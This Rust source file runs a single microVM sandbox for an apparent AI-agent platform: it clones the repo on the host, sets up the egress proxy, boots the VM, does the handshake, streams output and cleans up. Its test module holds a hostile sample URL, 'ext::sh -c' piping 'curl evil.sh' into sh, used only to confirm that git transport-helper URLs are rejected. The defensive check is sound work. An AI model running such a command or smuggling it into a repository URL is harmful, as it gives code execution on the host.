//! Orchestration of one sandbox run: provision → boot → handshake → exec →
//! stream → reap → dispose. Emits JSON-line events to the connected client.

use std::path::PathBuf;
use std::sync::atomic::{AtomicU32, AtomicU64, Ordering};
use std::sync::Arc;
use std::time::Duration;

use agentos_core::protocol::{GuestMessage, HostMessage, PROTOCOL_VERSION};
use agentos_core::{
    Error, NetPolicy, Result, SandboxSpec, SandboxState, TerminationDisposition,
    GUEST_CONTROL_PORT,
};
use agentos_vmm::{share_tag, SandboxPaths};
use serde_json::json;
use tokio::io::{AsyncWrite, AsyncWriteExt};
use tokio::sync::Mutex;
use tracing::info;

use crate::monitor;
use crate::proxy;
use crate::registry::Registry;
use crate::frames;

const HANDSHAKE_TIMEOUT: Duration = Duration::from_secs(15);

async fn emit(
    w: &mut (impl AsyncWrite + Unpin),
    event: serde_json::Value,
) -> std::io::Result<()> {
    let mut line = serde_json::to_vec(&event)?;
    line.push(b'\n');
    w.write_all(&line).await?;
    w.flush().await
}

/// Run one sandbox to completion, streaming events to `client`.
pub async fn run_sandbox(
    registry: Registry,
    spec: SandboxSpec,
    client: &mut (impl AsyncWrite + Unpin),
) -> std::io::Result<()> {
    let id = registry.create(spec.clone()).await;
    emit(client, json!({ "event": "created", "id": id })).await?;

    match drive(&registry, &id, spec, client).await {
        Ok(()) => Ok(()),
        Err(e) => {
            tracing::warn!(%id, error = %e, "sandbox run failed");
            registry
                .set_state(
                    &id,
                    SandboxState::Killed {
                        reason: format!("error: {e}"),
                        // Keep the sandbox dir (console/helper logs) on errors.
                        disposition: TerminationDisposition::Save,
                    },
                )
                .await;
            emit(client, json!({ "event": "error", "message": e.to_string() })).await
        }
    }
}

fn agentos_home() -> PathBuf {
    PathBuf::from(std::env::var_os("HOME").expect("HOME not set")).join(".agentos")
}


/// Reject git "transport helper" URLs (`ext::<cmd>`, `fd::…`), which make git
/// execute an arbitrary command **on the host**. `--` stops option injection
/// but not these. Repo URLs are user-supplied today, so this is defense in
/// depth — it keeps a URL from becoming host code execution if one ever
/// arrives from a less-trusted source (fleet policy, an agent's suggestion).
fn reject_transport_helper(url: &str) -> Result<()> {
    // Helper syntax is `<word>::rest`; a real URL's "::" only ever appears
    // after a '/' (path) or inside an IPv6 authority.
    if let Some((prefix, _)) = url.split_once("::") {
        if !prefix.contains('/') && !prefix.contains('[') {
            return Err(Error::InvalidSpec(format!(
                "refusing git transport-helper URL {url:?}: \
                 {prefix}:: can execute commands on the host"
            )));
        }
    }
    Ok(())
}

/// Clone `repo` into `dest` on the host. Runs the host's `git`, so it uses
/// whatever credentials the host already has — none of which is exposed to
/// the guest, which only ever sees the checked-out files. Shallow by default.
async fn clone_repo(repo: &agentos_core::RepoSpec, dest: &std::path::Path) -> Result<()> {
    reject_transport_helper(&repo.url)?;

    let mut cmd = tokio::process::Command::new("git");
    cmd.arg("clone").arg("--depth").arg("1");
    if let Some(r) = &repo.git_ref {
        cmd.arg("--branch").arg(r);
    }
    // `--` guards against a URL that looks like an option.
    cmd.arg("--").arg(&repo.url).arg(dest);
    cmd.stdin(std::process::Stdio::null());

    let out = cmd
        .output()
        .await
        .map_err(|e| Error::Backend(format!("running git: {e}")))?;
    if !out.status.success() {
        let stderr = String::from_utf8_lossy(&out.stderr);
        return Err(Error::InvalidSpec(format!(
            "git clone {} failed: {}",
            repo.url,
            stderr.trim()
        )));
    }
    Ok(())
}

async fn drive(
    registry: &Registry,
    id: &agentos_core::SandboxId,
    mut spec: SandboxSpec,
    client: &mut (impl AsyncWrite + Unpin),
) -> Result<()> {
    // Provision: images present, mount sources valid.
    let home = agentos_home();
    let images = home.join("images");
    let kernel = images.join("kernel");
    let initramfs = images.join("initramfs.cpio.gz");
    for p in [&kernel, &initramfs] {
        if !p.exists() {
            return Err(Error::Backend(format!(
                "guest image missing: {} (run scripts/build-guest-image.sh)",
                p.display()
            )));
        }
    }
    for m in &mut spec.mounts {
        let canon = m.host_path.canonicalize().map_err(|e| {
            Error::InvalidSpec(format!("mount {}: {e}", m.host_path.display()))
        })?;
        if !canon.is_dir() {
            return Err(Error::InvalidSpec(format!(
                "mount {} is not a directory",
                canon.display()
            )));
        }
        m.host_path = canon;
    }

    let sandbox_dir = home.join("sandboxes").join(id.to_string());
    std::fs::create_dir_all(&sandbox_dir)?;

    // Git repo: clone host-side (with the host's git + credentials), then mount
    // the working tree RW at /workspace. Keys/tokens never enter the guest.
    if let Some(repo) = spec.repo.clone() {
        emit(client, json!({ "event": "cloning", "url": repo.url }))
            .await
            .map_err(Error::Io)?;
        let dest = sandbox_dir.join("workspace");
        clone_repo(&repo, &dest).await?;
        spec.mounts.push(agentos_core::MountSpec {
            host_path: dest,
            guest_path: agentos_core::REPO_GUEST_PATH.into(),
            mode: agentos_core::MountMode::ReadWrite,
        });
    }

    // Runtime rootfs (shared, read-only) + a fresh per-sandbox writable overlay
    // disk sized to the disk quota. Optional: without the rootfs image the guest
    // falls back to the initramfs (busybox only, no persistence).
    let rootfs = images.join("rootfs.squashfs");
    let (rootfs, overlay) = if rootfs.exists() {
        let overlay = sandbox_dir.join("overlay.img");
        let f = std::fs::File::create(&overlay)?;
        // Sparse: allocates lazily, capped at the quota.
        f.set_len(u64::from(spec.limits.disk_mib) * 1024 * 1024)?;
        (Some(rootfs), Some(overlay))
    } else {
        (None, None)
    };

    let backend = agentos_vmm::default_backend()?;

    // Egress proxy (unless offline: then there is no egress path at all).
    // The socket location is the backend's call: guest-initiated vsock
    // connections must land on it (CH's hybrid vsock names it by convention).
    let egress_bytes = Arc::new(AtomicU64::new(0));
    let (proxy_socket, proxy_task) = if matches!(spec.net, NetPolicy::Offline) {
        (None, None)
    } else {
        let path = backend.proxy_socket_path(&sandbox_dir);
        let policy = spec.net.clone();
        let bytes = egress_bytes.clone();
        let sock = path.clone();
        let reg = registry.clone();
        let sid = id.clone();
        let task = tokio::spawn(async move {
            if let Err(e) = proxy::serve(&sock, policy, bytes, reg, sid).await {
                tracing::warn!(error = %e, "egress proxy stopped");
            }
        });
        (Some(path), Some(task))
    };

    let paths = SandboxPaths {
        sandbox_dir: sandbox_dir.clone(),
        kernel,
        initramfs,
        rootfs,
        overlay,
        proxy_socket,
    };

    // Boot.
    info!(%id, backend = backend.name(), "booting microVM");
    let mut handle = backend.create(&spec, &paths).await?;
    registry.set_state(id, SandboxState::Booting).await;

    let mut stream = handle.connect_vsock(GUEST_CONTROL_PORT).await?;
    let shared = Arc::new(Mutex::new(handle));
    registry.set_handle(id, shared.clone()).await;

    // Handshake (bounded: a wedged boot must not hang the client forever).
    let hello = async {
        frames::write_host_frame(&mut stream, &HostMessage::Hello { version: PROTOCOL_VERSION })
            .await?;
        frames::read_guest_frame(&mut stream).await
    };
    match tokio::time::timeout(HANDSHAKE_TIMEOUT, hello).await {
        Ok(Ok(Some(GuestMessage::Hello { version }))) if version == PROTOCOL_VERSION => {}
        Ok(Ok(other)) => {
            return Err(Error::Protocol(format!("bad handshake reply: {other:?}")));
        }
        Ok(Err(e)) => return Err(Error::Io(e)),
        Err(_) => {
            shared.lock().await.kill().await.ok();
            return Err(Error::Protocol(format!(
                "guest agent did not answer within {HANDSHAKE_TIMEOUT:?} (see {}/console.log)",
                sandbox_dir.display()
            )));
        }
    }

    // Exec.
    let exec_mounts = spec
        .mounts
        .iter()
        .enumerate()
        .map(|(i, m)| {
            (
                share_tag(i),
                m.guest_path.to_string_lossy().into_owned(),
                m.mode == agentos_core::MountMode::ReadOnly,
            )
        })
        .collect();
    // Run in the cloned repo when one was provided.
    let cwd = spec
        .repo
        .as_ref()
        .map(|_| agentos_core::REPO_GUEST_PATH.to_string());
    frames::write_host_frame(
        &mut stream,
        &HostMessage::Exec {
            command: spec.command.clone(),
            env: spec.env.clone(),
            mounts: exec_mounts,
            net: spec.net.clone(),
            cwd,
        },
    )
    .await?;
    registry.set_state(id, SandboxState::Running).await;
    emit(client, json!({ "event": "running" }))
        .await
        .map_err(Error::Io)?;

    // Auto-kill monitor: samples guest CPU/memory (from Metrics frames below),
    // proxy egress bytes, and wall-clock runtime.
    let guest_mem = Arc::new(AtomicU32::new(0));
    let guest_cpu = Arc::new(AtomicU32::new(0));
    let monitor_task = tokio::spawn(monitor::watch(
        registry.clone(),
        id.clone(),
        spec.auto_kill,
        guest_cpu.clone(),
        guest_mem.clone(),
        egress_bytes.clone(),
    ));

    // Stream until Exited or EOF.
    let mut exit_info = None;
    while let Some(msg) = frames::read_guest_frame(&mut stream).await? {
        match msg {
            GuestMessage::Stdout { data } => {
                emit(client, json!({ "event": "stdout", "data": data }))
                    .await
                    .map_err(Error::Io)?;
            }
            GuestMessage::Stderr { data } => {
                emit(client, json!({ "event": "stderr", "data": data }))
                    .await
                    .map_err(Error::Io)?;
            }
            GuestMessage::Metrics { mem_mib, cpu_percent, .. } => {
                guest_mem.store(mem_mib, Ordering::Relaxed);
                guest_cpu.store(cpu_percent, Ordering::Relaxed);
            }
            GuestMessage::Exited { info } => {
                exit_info = Some(info);
                break;
            }
            GuestMessage::Hello { .. } => {}
        }
    }
    monitor_task.abort();

    // Reap the VMM child (guest powers off after Exited; EOF means it died
    // or was killed).
    let vmm_exit = shared.lock().await.wait().await;
    if let Some(t) = proxy_task {
        t.abort();
    }
    info!(%id, ?exit_info, ?vmm_exit, "sandbox finished");

    match exit_info {
        Some(info) => {
            registry.set_state(id, SandboxState::Exited { info }).await;
            std::fs::remove_dir_all(&sandbox_dir).ok(); // normal exit: wipe
            emit(
                client,
                json!({ "event": "exited", "code": info.code, "signal": info.signal }),
            )
            .await
            .map_err(Error::Io)?;
        }
        None => {
            // EOF without Exited: the kill switch fired (manual or auto).
            let (reason, disposition) = match registry.get_state(id).await {
                Some(SandboxState::Killed { reason, disposition }) => (reason, disposition),
                _ => ("vmm died".to_string(), TerminationDisposition::Save),
            };
            match disposition {
                TerminationDisposition::Wipe => {
                    std::fs::remove_dir_all(&sandbox_dir).ok();
                }
                TerminationDisposition::Save => {
                    info!(%id, dir = %sandbox_dir.display(), "sandbox state saved");
                }
            }
            emit(
                client,
                json!({
                    "event": "terminated",
                    "reason": reason,
                    "saved_dir": matches!(disposition, TerminationDisposition::Save)
                        .then(|| sandbox_dir.display().to_string()),
                }),
            )
            .await
            .map_err(Error::Io)?;
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::reject_transport_helper;

    #[test]
    fn transport_helpers_rejected_ordinary_urls_allowed() {
        for bad in [
            "ext::sh -c 'curl evil.sh | sh'",
            "fd::7",
            "ext::git-upload-pack",
        ] {
            assert!(reject_transport_helper(bad).is_err(), "{bad} must be refused");
        }
        for ok in [
            "https://github.com/octocat/Hello-World.git",
            "git@github.com:octocat/Hello-World.git",
            "ssh://git@host:22/repo.git",
            "/local/path/repo",
            // "::" legitimately appearing later in a URL is fine.
            "https://host/weird::path.git",
        ] {
            assert!(reject_transport_helper(ok).is_ok(), "{ok} must be allowed");
        }
    }
}
